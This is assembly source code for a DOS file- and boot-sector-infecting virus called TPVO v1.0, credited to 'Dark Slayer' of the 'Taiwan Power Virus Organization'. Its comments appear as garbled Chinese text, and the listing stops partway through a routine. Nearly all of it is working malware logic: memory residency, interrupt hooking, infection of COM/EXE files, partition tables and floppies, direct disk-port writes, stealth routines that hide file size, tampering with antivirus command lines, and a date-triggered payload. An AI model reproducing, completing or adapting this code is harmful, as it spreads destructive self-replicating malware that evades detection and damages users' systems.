
                                                                     P.002

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘C ´Á      TP
         oV                                                        PV
         TO                Ææ  TPVO v1.0 ¯f¬r  Ææ                  Vo
         pT                                                        OT
         VP                    by Dark Slayer                      VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


        ==============================================================


vir_size        equ     offset vir_end-offset start     ; ¯f¬rªø«×
vir_para_size   equ     (vir_size+0fh)/10h              ; ¯f¬rªø«× (para)
vir_sectors     equ     (vir_size+1ffh)/200h            ; ¯f¬r©Ò©Ò»ÝªººÏ°Ï

mem_size        equ     offset mem_end-offset start     ; ±`¾nªº°O¾ÐÅé¤j¤p
mem_para_size   equ     (mem_size+0fh)/10h      ; ±`¾nªº°O¾ÐÅé¤j¤p (para)

stack_size      equ     512                     ; ¯f¬r¦b°õ¦æÀÉ¤¤©Ò»Ýªº°ïÅ|

                .8086
                .model  tiny
                .code
                org     0
start:
                mov     bp,sp
                cli
                mov     ah,30h
                int     21h             ; ¨ú DOS ª©¥», ¶¶«K§Q¥Î¤¤Â_¨Ó­«©w¦ì
                ; ¦]¬°©I¥s¤¤Â_«á, CPU ·|¦b°ïÅ|©ñ¤Jªð¦^®Éªº IP¡BCS¡BFlags
delta:          mov     bp,ss:[bp-6]    ; bp = offset delta (ªð¦^®Éªº IP)
                cld
                lea     si,[bp-(offset delta-offset start)]     ; ­pºâ°¾²¾
                cmp     al,3            ; DOS < 3.0?
                jl      run_host_       ; ¬O«h¤£±`¾n
                push    si es           ; «O¦s si (¯f¬r°¾²¾)¡Bes (PSP °Ï¬q)
                xor     bx,bx           ; bx = 0
                mov     dx,ds:[bx+2]    ; dx = °O¾ÐÅé³»ºÝ
                mov     ds,bx           ; ds = 0
                mov     ah,4ah
                dec     bx              ; bx = 0ffffh
                int     21h             ; ­×§ï°O¾ÐÅé
                sub     dh,5            ; dx = °O¾ÐÅé³»ºÝ (°Ï¬q) - 500h
                xor     ax,ax           ; ax = 0
                int     12h             ; ¨ú¥D°O¾ÐÅé¤j¤p (kilo)
                xchg    cx,ax           ; cx = ax
                jcxz    msg             ; if cx = 0 then jump
; ¦]¬°¦b PV ªº¼ÒÀÀÀô¹Ò¤U, ¥u¦³¼ÒÀÀ³¡¥÷ªº¤¤Â_¥\¯à, ¨ä¥¦ªº¤¤Â_«ü¦V iret
; ©Ò¥H¦b©I¥s int 12h ¤§«e³] ax = 0, ©I¥s«á... ¦pªG ax ¤´µM¬O 0 ªº¸Ü,
; ªí¥Ü¬O¦b PV ªº¼ÒÀÀÀô¹Ò¤U, «h§Ú­Ì¸õ¨ì¤@³B«Dµ{¦¡½Xªº¦a¤è

                mov     ah,26h
                cmp     byte ptr ds:[4f1h],0eah ; 0:4f1h = 0eah?
                je      run_host        ; ¬Oªº¸Ü... ªí¥Ü¤w¸g±`¾n, ´N¤£»Ý¦A±`¾n
                int     21h             ; ¦b°O¾ÐÅé³»ºÝ - 500h ³B»s³y¤@­Ó PSP
                ; ¥Øªº¦b©óÂÐ»\ COMMAND.COM ªº«D±`¾n³¡¥÷, ¥H«K·P¬V COMMAND.COM
                mov     ah,4ah
                sub     bx,mem_para_size+1
                int     21h             ; ÁY´î°O¾ÐÅé¤j¤p (ªÅ¥X¤@¶ôªÅ¶¡¥H«K±`¾n)
                jc      run_host
                add     ax,bx
                mov     ds,ax           ; ds «ü¦V¦¹ªÅ¶¡ªº MCB
                xor     di,di
                add     word ptr ds:mcb_onwer_seg[di],8 ; ±N¦¹ MCB ³]¬°¨t²ÎÄÝ©Ê
                inc     ax
                mov     es,ax           ; es = ±`¾nªº¥Øªº¦a
                mov     cx,vir_size
                lea     ax,run_host[si]-offset start
                push    cs ax
                mov     ax,offset high_mem_code
                push    es ax
                rep     movs byte ptr es:[di],cs:[si]   ; ·h²¾¦Ü°ª°O¾ÐÅé°Ï
                retf                    ; ¸õ¦Ü°ª°O¾ÐÅé°Ï

run_host:       pop     es si           ; ¨ú¥X si (¯f¬r°¾²¾)¡Bes (PSP °Ï¬q)
run_host_:      push    cs
                pop     ds              ; ds = cs
                jmp     $+2     ; ¦b·P¬V COM ÀÉ®É·|±N¦¹ jmp ³]¬° jmp $+2
                                ; ·P¬V EXE ÀÉ®É«h·|±N¦¹ jmp ³]¬° jmp exe_host
host_select_jmp =       byte ptr $-1
com_host:       mov     di,100h-1       ; di = 0ffh
                scasb                   ; di = di + 1 = 0ffh + 1 = 100h
                push    di              ; push 100h (COM ÀÉ¶}©l³B)
                add     si,offset host_header   ; ­ìÀÉÀY¸ê®Æ
                movsb                   ; «ì´_­ìÀÉ®×¶}ÀYªº 3 bytes
                movsw
                ret                     ; ªð¦^ (°õ¦æ­ìÀÉ®×)

exe_host:       mov     ax,es           ; ax = PSP
                add     ax,10h          ; ax = PSP + 10h
                add     ds:host_header[eh_cs+si],ax     ; ­pºâ exe ªº cs ­È
                add     ax,ds:host_header[eh_ss+si]     ; ­pºâ exe ªº ss ­È
                cli
                mov     ss,ax                           ; ­×§ï°ïÅ|¦Ü­ì exe ÀÉ
                mov     sp,ds:host_header[eh_sp+si]
                sti
                push    es
                pop     ds                              ; ds = es = PSP
                jmp     dword ptr cs:host_header[eh_ip+si]
                ; ¸õ¦Ü­ìÀÉ®×

msg:            db      ' HI! This is [TPVO] virus was written by '
                db      'Dark Slayer in Keelung, Taiwan. '
                db      'keep in mind... '
                db      'The TPVO is "Taiwan Power Virus Organization" '

high_mem_code:  call    set_int13_21_2f         ; Äd¤¤Â_ int 13h¡B21h¡B2fh
                xor     si,si                   ; si = 0
                mov     ah,51h
                int     21h                     ; ¨ú PSP °Ï¬q
                mov     ds,bx                   ; ds = PSP °Ï¬q
                mov     cx,ds:[si+2ch]          ; cx = Àô¹ÒÅÜ¼Æ°Ï¬q
                jcxz    infect_partition        ; if cx = 0 then jump to
                                                ; infect_partition
; ¦b¶}¾÷®É, ¦pªG¯f¬r±q³Q·P¬Vªº COMMAND.COM ±Ò°Êªº¸Ü, «hÀô¹ÒÅÜ¼Æ°Ï¬q = 0
                mov     ds,cx
find_host_name: inc     si
                cmp     word ptr ds:[si],0      ; ·j´M¥Ø«eªº°õ¦æÀÉ¦W
                jne     find_host_name
                lodsw                           ; si = si + 2
                lodsw
                mov     dx,si                   ; ds:dx = ¥Ø«eªº°õ¦æÀÉ¦W
                call    comp_av_name            ; ¤ñ¸û¬O§_¬°¨¾¬rµ{¦¡ªºÀÉ¦W?
                jne     infect_partition        ; ¤£¬O«hÂ÷¶}
                xchg    dx,ax
                mov     es,bx
                mov     bx,80h          ; es:ax = PSP:80h = DOS ©R¥O¦C°Ñ¼Æ
                call    move_av_command         ; ­×§ï¨¾¬rµ{¦¡ªº©R¥O¦C°Ñ¼Æ
infect_partition:                               ; ·P¬VµwºÐ¤À³Îªí
                mov     ax,201h
                mov     bx,offset disk_buffer
                push    cs
                pop     es
                mov     cx,1
                mov     dx,80h
                int     13h     ; ¦]¬°¤w¸gÄd int 13h ¤F, ©Ò¥HÅª¨úªº°Ê§@¤]·|·P¬V
                retf                            ; ªð¦^¥h°õ¦æ­ìµ{¦¡

; ¨ú¤¤Â_¦V¶q¦ì§}
; input:  al = ¤¤Â_½s¸¹
; output: es:bx «ü¦V¦¹¤¤Â_ªº¦ì§}
get_int:        push    ax
                cbw
                add     ax,ax
                add     ax,ax
                xchg    bx,ax
                xor     ax,ax
                mov     es,ax
                les     bx,es:[bx]
                pop     ax
                ret

; ³]¤¤Â_¦V¶q¦ì§}
; input:  al = ¤¤Â_½s¸¹
;         ds:dx «ü¦V·s¤¤Â_ªº¦ì§}
set_int:        push    ax bx ds
                cbw
                add     ax,ax
                add     ax,ax
                xchg    bx,ax
                push    ds
                xor     ax,ax
                mov     ds,ax
                mov     ds:[bx],dx
                pop     ds:[bx+2]
                pop     ds bx ax
                ret

; ³]¤¤Â_¦V¶q 13h¡B21h¡B2fh
set_int13_21_2f:mov     byte ptr cs:active_flag,0       ; µo§@ºX¼Ð = 0 (¤£µo§@)
                mov     al,13h
                mov     dx,offset int13
                mov     si,offset old13
                mov     di,4f1h
                call    set_int_far_jmp

; ³]¤¤Â_¦V¶q 21h¡B2fh
set_int21_2f:   mov     al,21h
                mov     dx,offset int21
                mov     si,offset old21
                mov     di,4f6h
                call    set_int_far_jmp
                mov     al,2fh
                mov     dx,offset int2f
                mov     si,offset old2f
set_int_far_jmp:call    get_int
                mov     cs:[si],bx
                mov     cs:[si+2],es
                xor     bx,bx
                mov     ds,bx
                mov     byte ptr ds:[di],0eah
                mov     ds:[di+1],dx
                mov     ds:[di+1+2],cs
                mov     dx,di
                call    set_int
                add     di,5
                ret

boot_code:      cli     ; ±Ò°ÊºÏ°Ïªºµ{¦¡½X (floppy boot & hd partition ¦@¥Î)
                xor     bx,bx
                mov     ss,bx                   ; ss = bx = 0
                mov     sp,7c00h                ; ss:sp = 0:7c00h
boot_mark:      mov     es,sp                   ; es = 7c00h
                mov     ax,200h+vir_sectors+1   ; Åª¨úºÏ°Ï vir_sectors + 1
                mov     cx,0
vir_body_cx     =       word ptr $-2    ; ¯f¬r¨­Åé¦s©ñ³Bªº cx ­È (for int 13h)
                mov     dx,0
vir_body_dx     =       word ptr $-2    ; ¯f¬r¨­Åé¦s©ñ³Bªº dx ­È (for int 13h)
                int     13h                     ; Åª¨ú¯f¬r¨­Åé
                jc      $               ; if error then do infinite loop
                db      0eah            ; jmp far to 7c00h:boot_start
                dw      offset boot_start,7c00h
boot_rnd        dw      ?               ; boot_rnd for disk cache
boot_code_end:

boot_start:     cld
                mov     byte ptr cs:int13,3ch   ; ³] int 13h ÀË¬d int 21h
                                                ; ¥H«KÄdºI
                call    set_int13_21_2f         ; Äd int 13h
                xor     ax,ax
                mov     es,ax                   ; es = 0
                mov     si,vir_sectors*512      ; si «ü¦V­ì±Ò°ÊºÏ°Ï
                mov     di,sp                   ; di = 7c00h
                mov     cx,512/2
                push    es di
                rep     movs word ptr es:[di],cs:[si]
                                                ; ±N­ì±Ò°ÊºÏ°Ï·h¦Ü 0000:7c00h
                call    get_date        ; ¨ú¤é´Á, ªð¦^«á al = ¤ë¥÷, ah = ¤é´Á
                sub     al,0
infected_month  =       byte ptr $-1            ; al = al - ³Q·P¬Vªº¤ë¥÷
                jb      next_year
                cmp     al,2
                jbe     dont_act                ; ·P¬VÁÙ¨S¶W¹L¨â­Ó¤ë«hÂ÷¶}
next_year:      shr     ah,1                    ; ¤é´Á¬°³æ¼Æ?
                jc      dont_act                ; ¬O«hÂ÷¶}
                in      al,40h                  ; ¨ú¶Ã¼Æ
                test    al,11b
                jnz     dont_act                ; ¦³ 3/4 ¤£µo§@ªº¾÷²v
                int     11h                     ; ¨ú³]³Æ¸ê°T
                and     al,30h
                cmp     al,30h
                je      dont_act                ; ¬O³æ¦â¿Ã¹õ«h¤£µo§@
                inc     byte ptr cs:active_flag ; ³]µo§@ºX¼Ð
dont_act:       retf

; ¨ú¨t²Î¤é´Á
; input:  none
; output: al = month, ah = day
get_date:       push    cx dx
                mov     ah,4
                int     1ah
                xchg    dx,ax
                xchg    al,ah
                pop     dx cx
                ret

;  ªþ¤WµwºÐª½±µ IO ªº¸ê®Æ
;  Technical Information on the ports:
;      Port    Read/Write   Misc
;     ------  ------------ -------------------------------------------------
;       1f0       r/w       data register, the bytes are written/read here
;       1f1       r         error register  (look these values up yourself)
;       1f2       r/w       sector count, how many sectors to read/write
;       1f3       r/w       sector number, the actual sector wanted
;       1f4       r/w       cylinder low, cylinders is 0-1024
;       1f5       r/w       cylinder high, this makes up the rest of the 1024
;       1f6       r/w       drive/head
;                              bit 7 = 1
;                              bit 6 = 0
;                              bit 5 = 1
;                              bit 4 = 0  drive 0 select
;                                    = 1  drive 1 select
;                              bit 3-0    head select bits
;       1f7       r         status register
;                              bit 7 = 1  controller is executing a command
;                              bit 6 = 1  drive is ready
;                              bit 5 = 1  write fault
;                              bit 4 = 1  seek complete
;                              bit 3 = 1  sector buffer requires servicing
;                              bit 2 = 1  disk data read corrected
;                              bit 1 = 1  index - set to 1 each revolution
;                              bit 0 = 1  previous command ended in an error
;       1f7       w         command register
;                            commands:
;                              50h format track
;                              20h read sectors with retry
;                              21h read sectors without retry
;                              22h read long with retry
;                              23h read long without retry
;                              30h write sectors with retry
;                              31h write sectors without retry
;                              32h write long with retry
;                              33h write long without retry


; ¿é¥X IO ¨ÃÀË¬d IO °Ê§@¬O§_§¹¦¨
; input:  al = ­n¿é¥Xªº¸ê®Æ
;         dx = ­n¿é¥Xªº port ½s¸¹
;        and ... °Ñ¦Ò°Æµ{¦¡ io_ready?
out_io_ready?:  out     dx,al

; ÀË¬d IO °Ê§@¬O§_§¹¦¨
; input:  bp = ¦pªG²£¥Í¿ù»~, «h¸õ¦V bp ©Ò«üªºµ{¦¡
; output: dx ­È·|¥[ 1 («ü¦V¤U¤@­Ó port)
;         CFlag = 0 ¦¨¥\
;         CFlag = 1 ¥¢±Ñ
io_ready?:      push    ax cx dx
                xor     cx,cx                   ; ÀË¬d°j°éªº¦¸¼Æ¬° 10000h ¦¸
                mov     dl,0f7h                 ; dx = 1f7h (µwºÐª¬ºA¼È¦s¾¹)
io_check_loop:  in      al,dx
                xor     al,01010000b
                test    al,11010000b
                loopnz  io_check_loop           ; IO ¥¼§¹¦¨«hÄ~Äò°j°é
                pop     dx cx ax
                jz      io_check_ok             ; IO °Ê§@¥¿½T«hÂ÷¶}
                stc                             ; IO ¿ù»~, C flag = 1
                pop     ax
                jmp     bp
io_check_ok:    inc     dx
                ret

; ÀË¬dµwºÐ¬O§_¾A¥Î©ó§Ú­Ìªºª½±µ IO µ{¦¡
; input:  ds = cs
; output: µwºÐ¾A¥Î©óª½±µ IO µ{¦¡   -> ¥´¶} hdio °Æµ{¦¡¨Ï¥Î¶}Ãö
;         µwºÐ¤£¾A¥Î©óª½±µ IO µ{¦¡ -> Ãö³¬ hdio °Æµ{¦¡¨Ï¥Î¶}Ãö
hdio_test:      mov     byte ptr ds:hdio_switch,0ebh ; ¥ý disable °Æµ{¦¡ hdio
                mov     bp,offset hdio_test_done
                                        ; ¦pªGµo¥Í¿ù»~«h¸õ¦Ü hdio_test_done
                mov     dx,1f1h         ; dx = 1f1h
                call    io_ready?       ; ÀË¬d IO ¬O§_³Æ§´?
                                ; ªð¦^«á dx = 1f2h -> ºÏ°ÏÅª¼g­p¼Æ¼È¦s¾¹
                mov     al,1            ; ¥uÅª¨ú¤@­ÓºÏ°Ï
                call    out_io_ready?   ; ¼g¤J¼È¦s¾¹¨ÃÀË¬d IO ¬O§_³Æ§´?
                                        ; ªð¦^«á dx = 1f3h -> ºÏ°Ï½s¸¹¼È¦s¾¹
                ; ºÏ°Ï½s¸¹¼È¦s¾¹ = al = 1
                call    out_io_ready?   ; ¼g¤J¼È¦s¾¹¨ÃÀË¬d IO ¬O§_³Æ§´?
                                ; ªð¦^«á dx = 1f4h -> ºÏ­y½s¸¹¼È¦s¾¹ (§C¦ì¤¸²Õ)
                dec     ax              ; ax = 0 (²Ä 0 ­y)
                call    out_io_ready?   ; ¼g¤J¼È¦s¾¹¨ÃÀË¬d IO ¬O§_³Æ§´?
                                ; ªð¦^«á dx = 1f5h -> ºÏ­y½s¸¹¼È¦s¾¹ (°ª¦ì¤¸²Õ)
                call    out_io_ready?   ; ¼g¤J¼È¦s¾¹¨ÃÀË¬d IO ¬O§_³Æ§´?
                                ; ªð¦^«á dx = 1f6h -> ºÏ­y½s¸¹¼È¦s¾¹ (§C¦ì¤¸²Õ)
                mov     al,0a0h         ; ²Ä 0 ­ÓµwºÐ, ²Ä 0 ­±
                call    out_io_ready?   ; ¼g¤J¼È¦s¾¹¨ÃÀË¬d IO ¬O§_³Æ§´?
                                        ; ªð¦^«á dx = 1f7h -> ©R¥O¼È¦s¾¹
                mov     al,20h          ; ©R¥O: Åª¨úºÏ°Ï
                call    out_io_ready?   ; ¼g¤J¼È¦s¾¹¨ÃÀË¬d IO ¬O§_³Æ§´?
                mov     cx,512/2
                mov     dl,0f0h         ; dx = 1f0h -> ¸ê®Æ¼È¦s¾¹
read_1sector:   in      ax,dx           ; Åª¨ú
                loop    read_1sector    ; Åª¨ú°j°é
                cmp     ax,0aa55h     ; ¤ñ¸ûºÏ°Ïªº³Ì«á¤@­Ó word ¬O§_¬° 0aa55h?
                jne     hdio_test_done  ; ¤£¬O«hÂ÷¶}
                mov     byte ptr ds:hdio_switch,79h     ; OPcode 79h = jns
                                        ; Enable °Æµ{¦¡ hdio
hdio_test_done: ret

int13_write:    mov     ah,3
                or      dl,dl
hdio_switch:    jns     bios13
hdio:           push    ax cx dx si di bp
                mov     cs:hdio_sp,sp
                mov     bp,offset hdio_exit
                push    ax
                push    dx
                mov     dx,1f1h
                call    io_ready?
                call    out_io_ready?
                mov     al,cl
                and     al,3fh
                call    out_io_ready?
                mov     al,ch
                call    out_io_ready?
                xchg    cx,ax
                mov     cl,6
                shr     al,cl
                call    out_io_ready?
                pop     ax
                mov     cl,4
                shl     al,cl
                or      al,ah
                or      al,0a0h
                call    out_io_ready?
                pop     ax
                xchg    al,ah
                shl     al,cl
                out     dx,al
                dec     cx
                shr     al,cl
                or      al,0edh
                mov     cs:io_code,al
                xor     cx,cx
                mov     cl,ah
                mov     si,bx
                mov     di,bx
                cld
access_loop:    call    io_ready?
                mov     dl,0f0h
                push    cx
                mov     cx,512/2
access_sector:  lods    word ptr es:[si]
io_code         db      ?
                stosw
                loop    access_sector
                pop     cx
                loop    access_loop
hdio_exit:      mov     sp,0
hdio_sp         =       word ptr $-2
                pop     bp di si dx cx ax
                ret

bios13:         pushf
                cli
                push    cs
                call    i13_exit
                ret

i13_exit:       db      0eah
old13           dw      ?,?

int13:          jmp     int13_
                call    save_regs
                mov     al,21h
                call    get_int
                mov     cx,es
                jcxz    dos_not_ready
                cmp     ch,8
                jae     dos_not_ready
                cmp     byte ptr es:[bx],0cfh
                je      dos_not_ready
                call    set_int21_2f
                mov     byte ptr cs:int13,0ebh
dos_not_ready:  call    load_regs

int13_:         cmp     ah,2
                jb      i13_exit
                cmp     ah,3
                ja      i13_exit
                cmp     cx,1
                jne     i13_exit
                or      dh,dh
                jnz     i13_exit
                cmp     dl,80h
                ja      i13_exit
                call    bios13
                jc      i13_retf2_
check_boot:     push    ax bx cx dx si di bp
                push    ds es
                pushf

                mov     si,bx
                push    es
                pop     ds

                mov     di,offset disk_buffer
                mov     cx,512/2
                cld
                push    cs
                cmp     word ptr ds:boot_mark[bx+3eh]-boot_code,0c48eh
                jne     infect_boot

                mov     ax,ds:boot_rnd[bx+3eh]-boot_code
                cmp     ax,0
now_buffer_rnd  =       word ptr $-2
                je      move_cache_sect

                mov     cx,ds:vir_body_cx[bx+3eh]-boot_code
                add     cl,vir_sectors
                mov     bx,di
                pop     es
                popf
                push    ax
                mov     ax,201h
                call    bios13
                pop     ax
                pushf
                jc      i13_retf2
                push    cs

move_cache_sect:push    ds
                pop     es
                pop     ds
                mov     ds:now_buffer_rnd,ax
                xchg    si,di
                mov     cx,512/2
                rep     movsw
i13_retf2:      popf
                pop     es ds
                pop     bp di si dx cx bx ax
i13_retf2_:     retf    2

infect_boot:    pop     es
                rep     movsw
                push    cs
                pop     ds
                mov     ds:now_buffer_rnd,cx
                cmp     word ptr ds:[di-2],0aa55h
                jne     i13_retf2
                or      dl,dl
                jns     infect_floppy

                mov     ax,1
                mov     cl,4
check_partition:cmp     ah,ds:pt_active_id[di-2-10h]
                je      non_active
                cmp     dl,ds:pt_active_id[di-2-10h]
                jne     i13_retf2
                dec     ax
                jnz     i13_retf2
                mov     bx,di
non_active:     sub     di,10h
                loop    check_partition
                dec     ax
                jz      i13_retf2
                mov     al,ds:pt_system_id[bx-2-10h]
                cmp     al,6
                ja      i13_retf2
                cmp     al,4
                jae     system_id_ok
                cmp     al,1
i13_retf2_ne:   jne     i13_retf2
system_id_ok:   mov     ax,word ptr ds:pt_last_sector[di-2]
                mov     cx,3fh
                and     cx,ax
                xor     ax,cx
                sub     cx,vir_sectors+1
                jbe     i13_retf2
                inc     cx
                inc     ah
                jnz     add_track_sect
                add     al,01000000b
add_track_sect: add     cx,ax
                push    cx dx
                call    hdio_test
                pop     dx cx
                jmp     infect_boot_

infect_floppy:  call    floopy_write_protected?_
                jc      i13_retf2
                mov     ax,ds:bs_sectors[di-200h]
                mov     cx,4f0fh
                cmp     ax,960h
                je      floppy_12m
                mov     cl,12h
                cmp     ax,0b40h
                jne     i13_retf2_ne
floppy_12m:     mov     ah,18h
                call    bios13
                jc      infect_exit
                xor     ax,ax
                mov     ds,ax
                mov     ax,es
                xchg    di,ds:[1eh*4]
                xchg    ax,ds:[1eh*4+2]
                push    di ax ds
                mov     ax,50ah
                mov     cx,5001h
                mov     bx,offset chrn
                push    cs
                pop     es
                call    bios13
                pop     ds ds:[1eh*4+2] ds:[1eh*4]
                jc      infect_exit
                push    cs
                pop     ds

infect_boot_:   call    get_date
                mov     ds:infected_month,al
                mov     ds:vir_body_cx,cx
                push    dx
                and     dl,80h
                mov     ds:vir_body_dx,dx
                pop     dx
                mov     al,vir_sectors
                xor     bx,bx
                call    int13_write
                jc      infect_exit
                mov     al,1
                mov     bx,offset disk_buffer
                add     cl,vir_sectors
                call    int13_write
                jc      infect_exit
boot_rnd_cant_be_zero:
                in      al,40h
                mov     ah,al
                in      al,40h
                or      al,al
                jz      boot_rnd_cant_be_zero
                mov     ds:boot_rnd,ax
                mov     word ptr ds:[bx],3cebh
                mov     si,offset boot_code
                lea     di,[bx+3eh]
                mov     cx,offset boot_code_end-offset boot_code
                rep     movsb
                mov     al,1
                inc     cx
                call    int13_write
infect_exit:    jmp     i13_retf2


comp_av_name:   mov     si,dx           ; ds:dx = file name
search_name_point:
                lodsb
                cmp     al,':'
                je      save_point
                cmp     al,'\'
                jne     name_end?
save_point:     mov     dx,si
name_end?:      or      al,al
                jnz     search_name_point
                mov     si,dx
                mov     di,offset file_name
                push    cs
                pop     es
                push    di
move_name_loop: lodsb
                call    b2s
                stosb
                or      al,al
                jnz     move_name_loop
                pop     di
                mov     si,offset av_name
                push    cs
                pop     ds
comp_av_name_loop:
                lodsb
                cbw
                mov     cx,ax
                jcxz    comp_av_name_exit
                add     ax,si
                push    ax di
                repe    cmpsb
                pop     di si
                lodsw
                jne     comp_av_name_loop
comp_av_name_exit:
                ret

move_av_command:lea     di,[bx+1]       ; es:bx = command line
                mov     si,di           ; dx    = offset appended command
                push    es
                pop     ds
                cld
search_0d:      lodsb
                cmp     dx,offset vt_cmd
                jne     not_vt
                cmp     al,'/'
                jne     not_vt
                stosb
                lodsb
                call    b2s
                cmp     al,'m'
                jne     not_vt
                sub     byte ptr ds:[bx],2
                dec     di
                lodsb
not_vt:         stosb
                cmp     al,0dh
                jne     search_0d
                mov     byte ptr ds:[di-1],' '
                mov     si,dx
                push    cs
                pop     ds
move_cmd:       movsb
                inc     byte ptr es:[bx]
                cmp     ds:[si-1],al
                jne     move_cmd
                ret

b2s:            cmp     al,'A'
                jb      b2s_exit
                cmp     al,'Z'
                ja      b2s_exit
                or      al,20h
b2s_exit:       ret

save_regs:      mov     cs:dos_ds,ds
                push    ds
                push    cs
                pop     ds
                pushf
                pop     ds:dos_flags
                mov     ds:dos_ax,ax
                mov     ds:dos_bx,bx
                mov     ds:dos_cx,cx
                mov     ds:dos_dx,dx
                mov     ds:dos_si,si
                mov     ds:dos_di,di
                mov     ds:dos_bp,bp
                mov     ds:dos_es,es
                pop     ds
                ret


int21:          call    save_regs
                mov     si,offset dos_function_table-2
                push    cs
                pop     ds
                cld
check_function_loop:
                inc     si
                inc     si
                lodsb
                or      al,al
                js      int21_exit
                cmp     al,ah
                jne     check_function_loop
                mov     ax,offset int21_exit
                push    ax
                lodsw
                shr     ax,1
                push    ax
                jnc     load_regs
                call    set_int24
load_regs:      mov     ax,0
dos_flags       =       word ptr $-2
                push    ax
                popf
                mov     ax,0
dos_ds          =       word ptr $-2
                mov     ds,ax
                mov     ax,0
dos_es          =       word ptr $-2
                mov     es,ax
                mov     ax,0
dos_ax          =       word ptr $-2
                mov     bx,0
dos_bx          =       word ptr $-2
                mov     cx,0
dos_cx          =       word ptr $-2
                mov     dx,0
dos_dx          =       word ptr $-2
                mov     si,0
dos_si          =       word ptr $-2
                mov     di,0
dos_di          =       word ptr $-2
                mov     bp,0
dos_bp          =       word ptr $-2
                ret

int21_exit:     call    unset_int24
                call    load_regs
jmp_int21:      db      0eah
old21           dw      ?,?

dos21:          pushf
                cli
                push    cs
                call    jmp_int21
                ret

dbw             macro   a,b,c
                db      a
                dw      ((b-offset start) shl 1) or c
                endm

dos_function_table:
                dbw     11h, dosf_11_12, 0
                dbw     12h, dosf_11_12, 0
                dbw     3ch, dosf_3c_5b, 0
                dbw     3dh, dosf_3d   , 1
                dbw     3eh, dosf_3e   , 1
                dbw     3fh, dosf_3f   , 0
                dbw     40h, dosf_40   , 0
                dbw     42h, dosf_42   , 0
                dbw     43h, dosf_43_56, 1
                dbw     4bh, dosf_4b   , 1
                dbw     4eh, dosf_4e_4f, 0
                dbw     4fh, dosf_4e_4f, 0
                dbw     56h, dosf_43_56, 1
                dbw     5bh, dosf_3c_5b, 0
                dbw     6ch, dosf_6c   , 1
                db      0ffh

stealth?:       mov     si,offset helper_name
                call    comp_name
                jne     load_regs
                pop     ax
                ret

comp_name:      push    cs
                pop     ds
                mov     di,offset mcb_name
                mov     ah,51h
                call    dos21
                dec     bx
                mov     es,bx
cn_loop:        lodsb
                cbw
                mov     cx,ax
                jcxz    comp_name_exit
                add     ax,si
                push    ax di
                repe    cmpsb
                pop     di si
                jne     cn_loop
comp_name_exit: ret

dosf_11_12:     call    stealth?
                call    dos21
                call    save_regs
                cmp     al,0ffh
                je      dir_file_is_clean
                mov     ah,2fh
                call    dos21
                mov     si,bx
                mov     di,offset file_name
                push    cs es
                pop     ds es
                cld
                lodsb
                cmp     al,0ffh
                jne     not_extend_fcb
                add     si,6
                lodsb
not_extend_fcb: mov     bx,word ptr ds:dir_size[si-1]
                sub     bl,6
                test    bl,7fh
                jnz     dir_file_is_clean
                push    si ds
                mov     cx,8
                or      al,al
                jz      now_drive
                add     al,'A'-1
                stosb
                mov     al,':'
                stosb
now_drive:      lodsb
                cmp     al,' '
                je      no_space
                stosb
no_space:       loop    now_drive
                mov     al,'.'
                stosb
                mov     cx,3
move_ext_name:  lodsb
                cmp     al,' '
                je      no_space_
                stosb
no_space_:      loop    move_ext_name
                mov     es:[di],cl
                mov     dx,offset file_name
                push    cs
                pop     ds
fake_size:      call    file_infected?
                pop     ds si
                jne     dir_file_is_clean
                jc      dir_file_is_clean
                les     ax,dword ptr cs:host_size
                mov     word ptr ds:dir_size[si-1],ax
                mov     word ptr ds:dir_size[si-1+2],es
dir_file_is_clean:
load_regs_retf: pop     ax
                call    unset_int24
                call    load_regs
                retf    2

dosf_4e_4f:     call    stealth?
                call    dos21
                call    save_regs
                jc      load_regs_retf
                mov     ah,2fh
                call    dos21
                push    es
                pop     ds
                mov     ax,word ptr ds:find_size[bx]
                sub     al,6
                test    al,7fh
                jnz     load_regs_retf
                lea     dx,find_name[bx]
                lea     si,find_size[bx]-(dir_size-1)
                push    si ds
                jmp     fake_size

dosf_3c_5b:     test    cl,11100b
                jnz     dosf_3c_5b_exit
                call    exe_or_com?
                jne     dosf_3c_5b_exit
dosf_3c_5b_6c_common:
                call    load_regs
                call    dos21
                call    save_regs
                jc      dosf_3c_5b_retf
                cmp     byte ptr cs:dos_ax[1],6ch
                jne     save_handle
                cmp     cl,1
                je      dosf_3c_5b_retf
save_handle:    mov     cs:dosf_3e_handle,ax
dosf_3c_5b_retf:jmp     load_regs_retf
dosf_3c_5b_exit:ret

dosf_6c:        test    cl,11100b
                jnz     dosf_3c_5b_exit
                call    exe_or_com?_
                jne     dosf_3c_5b_exit
                call    load_regs
                pushf
                test    bl,1
                jz      dosf_6c_read_mode
                xor     bl,11b
dosf_6c_read_mode:
                popf
                push    dx
                mov     dx,si
                call    save_regs
                call    infect_file
                call    unset_int24
                pop     cs:dos_dx
                jmp     dosf_3c_5b_6c_common

dosf_3e:        db      81h,0fbh        ; cmp bx,xxxx
dosf_3e_handle  dw      0ffffh
                jne     dosf_3e_exit
                call    handle_infected?
                jbe     dosf_3e_exit
                call    get_seek_point
                push    ax dx bx
                call    seek_to_head
                mov     ah,45h
                call    infect_handle
                pop     bx cx dx
                call    seek_from_head
                or      word ptr cs:dosf_3e_handle,0ffffh
dosf_3e_exit:   ret

dosf_3f:        call    stealth?
                call    handle_infected?
                jne     dosf_3e_exit
                jc      dosf_3e_exit
                and     word ptr ds:dos_ax,0
                call    get_seek_point
                or      dx,dx
                jnz     read_not_header
                cmp     ax,18h
                jae     read_not_header
                add     ax,offset new_header
                xchg    si,ax
                mov     cx,ds:dos_cx
                mov     di,ds:dos_dx
                mov     es,ds:dos_ds
                cld
move_header:    movsb
                inc     word ptr ds:dos_ax
                cmp     si,offset new_header+18h
                jae     move_header_done
                loop    move_header
move_header_done:
                call    get_seek_point
                add     ax,ds:dos_ax
                adc     dx,0
                mov     cx,dx
                xchg    dx,ax
                call    seek_from_head
read_not_header:mov     cx,ds:dos_cx
                sub     cx,ds:dos_ax

                sub     ax,ds:host_size
                sbb     dx,ds:host_size[2]
                jb      read_less_host_size
                xor     cx,cx
read_less_host_size:
                not     ax
                not     dx
                add     ax,1
                adc     dx,0
                jnz     read_all
                cmp     cx,ax
